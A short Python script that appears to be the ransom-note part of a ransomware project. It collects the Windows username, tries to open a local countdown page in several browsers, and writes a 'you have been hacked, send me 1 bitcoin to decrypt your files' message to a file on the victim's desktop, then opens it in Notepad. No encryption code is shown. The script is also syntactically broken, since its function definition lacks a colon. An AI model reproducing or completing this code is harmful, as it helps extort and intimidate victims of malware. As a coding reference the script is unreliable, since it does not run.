#!/usr/bin/env python
#coding:utf-8
import subprocess, sys, os
import subprocess as sub
import ctypes, sys


victim = os.environ["USERNAME"]
drive = os.environ["SystemDrive"]

locate = os.getcwd()

pathCompteur = "{}\\setup\\assets\\compteur.htm".format(locate)
internetExplorer = "start iexplore.exe {}".format(pathCompteur)
chrome = "start chrome.exe {}".format(pathCompteur)
edge = "msedge.exe {}".format(pathCompteur)
firefox = "start firefox.exe {}".format(pathCompteur)


def countdown()
    try:
        os.system(internetExplorer)
    except:
        pass
        try:
            os.system(chrome)
        except :
            pass
            try:
                os.system(edge)
            except:
                pass
                try:
                    os.system(firefox)
                except:
                    pass
                    try:
                            text = "Hello {}, You have been hacked! Send me 1 bitcoin if you want to decrypt your files!  My bitcoin adress is: https://www.bitcoin.com/".format(victim)
                            path = "{}\\Users\\{}\\Desktop\\{}".format(drive, victim, victim)
                            text_path = "echo {} >> {}".format(text, path)
                            os.system(text_path)

                            path = "{}\\Users\\{}\\Desktop\\{}".format(drive, victim, victim)
                            openDoc = "notepad {}".format(path)
                            os.system(openDoc)
                    except:
                        pass
